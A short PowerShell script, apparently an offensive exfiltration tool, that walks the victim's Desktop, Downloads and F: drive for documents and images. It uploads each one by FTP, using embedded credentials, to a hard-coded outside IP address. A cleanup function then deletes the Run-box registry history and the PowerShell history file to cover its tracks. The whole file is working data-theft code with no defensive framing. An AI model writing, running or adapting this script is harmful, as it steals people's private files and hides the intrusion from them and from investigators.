$web=New-Object System.Net.WebClient
$Dir = "C:\Users\$env:username\desktop","C:\Users\$env:username\Downloads","F:\"
$FTP = "ftp://testadmin:testpassword@192.119.71.89/files/"

foreach($item in (Get-ChildItem $Dir -Include *.txt,*.xlsx,*.pdf,*.ppt,*.docx,*.jpeg,*.jpg,*.png -Recurse)){
    $URI = New-Object System.Uri($FTP+$item.Name)
    $web.UploadFile($URI, $item.FullName)
}
function Clean-Exfil{

	#delete run box history
	reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
	
	#delete powershell history
	Remove-Item (Get-PSreadlineOption).HistorySavePath
}
Clean-Exfil